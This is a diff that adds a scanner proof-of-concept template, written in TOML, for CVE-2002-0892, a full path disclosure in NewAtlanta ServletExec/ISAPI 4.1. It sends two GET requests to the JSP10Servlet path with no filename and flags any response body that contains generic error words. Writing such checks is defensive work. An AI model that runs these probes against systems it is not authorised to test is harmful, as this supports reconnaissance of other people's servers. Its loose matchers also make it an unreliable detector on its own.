@@ -1,0 +1,52 @@
+[info]
+author = "AVE"
+description = "检测 NewAtlanta ServletExec/ISAPI 4.1 全路径泄漏漏洞。向 com.newatlanta.servletexec.JSP10Servlet 发送不含文件名的请求，若返回错误信息中包含文件系统路径则存在漏洞。"
+id = "POC-AVE-2002-0461"
+name = "NewAtlanta ServletExec ISAPI 4.1 Full Path Disclosure PoC"
+severity = "medium"
+tags = [
+    "cve-2002-0892",
+    "path-disclosure",
+    "servletexec",
+]
+vuln_id = [
+    "CVE-2002-0892",
+    "AVE-2002-0461",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/servlet/com.newatlanta.servletexec.JSP10Servlet"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "FileNotFound",
+    "Error",
+    "exception",
+    "does not exist",
+    "File &quot;",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/servlet/com.newatlanta.servletexec.JSP10Servlet/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "FileNotFound",
+    "Error",
+    "exception",
+    "does not exist",
+    "File &quot;",
+]
